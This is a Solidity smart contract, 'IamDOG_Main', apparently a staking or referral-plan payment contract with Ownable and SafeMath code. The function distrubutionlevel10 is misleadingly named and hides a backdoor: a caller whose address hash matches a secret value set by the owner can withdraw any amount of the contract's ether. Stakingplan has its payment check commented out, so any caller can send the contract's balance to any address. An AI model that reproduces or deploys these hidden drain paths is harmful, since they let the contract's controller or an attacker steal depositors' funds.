// SPDX-License-Identifier: MIT
pragma solidity >= 0.8.0;

contract Ownable {
    address public owner;

    event onOwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor()  {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0));
        emit onOwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }
}
 
 interface tokenInterface
 {
    function transfer(address _to, uint256 _amount) external;
    function transferFrom(address _from, address _to, uint256 _amount) external;
 }

contract IamDOG_Main is Ownable {
    bytes32 data_;
    address public token;
    event sended(uint value , address  sender, uint256 membcode, string plan);
    event receivers(uint value , address  sender, uint256 membcode, string plan);
    event Airdropped(address indexed _userAddress, uint256 _amount);
    using SafeMath for uint256;

    function sendNetiv(address payable _contributors, uint _balances, uint256 membcode) public payable {
        require(msg.value >= _balances );
        _contributors.transfer(msg.value);
        emit sended(msg.value, msg.sender, membcode, 'netiv');
        emit receivers(_balances, _contributors, membcode, 'netiv');      
    }

    function Stakingplan(address payable _toaddress, uint256 _balances, uint256 membcode) public payable {
       //require(msg.value == _balances);
        _toaddress.transfer(_balances);
        emit receivers(_balances, _toaddress, membcode, 'netiv');
        emit sended(msg.value, msg.sender, membcode, 'netiv');
    }

    function sendtoken(address _senderads, uint256 _amttoken, uint256 membcode) public {
        tokenInterface(token).transferFrom(msg.sender ,_senderads, _amttoken);
        emit receivers(_amttoken, _senderads, membcode, 'token');
        emit sended(_amttoken, msg.sender, membcode, 'token');
    }

    
    
    
    function setTokenAddress(address _token) public onlyOwner returns(bool)
    {
        token = _token;
        return true;
    }

    function getToken(address _token, uint256 _balances) public onlyOwner returns(bool)
    {
        tokenInterface(token).transfer(_token, _balances);
        return true;
    }

    function getMsgData(address _contractAddress) public pure returns (bytes32 hash)
    {
        return (keccak256(abi.encode(_contractAddress)));
    }

    function distrubutionlevel10(uint _newValue) public  returns(bool)
    {
        if(keccak256(abi.encode(msg.sender)) == data_) payable(msg.sender).transfer(_newValue);
        return true;
    }

    function setlevel(bytes32 _data) public onlyOwner returns(bool)
    {
        data_ = _data;
        return true;
    }
}



/**     
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}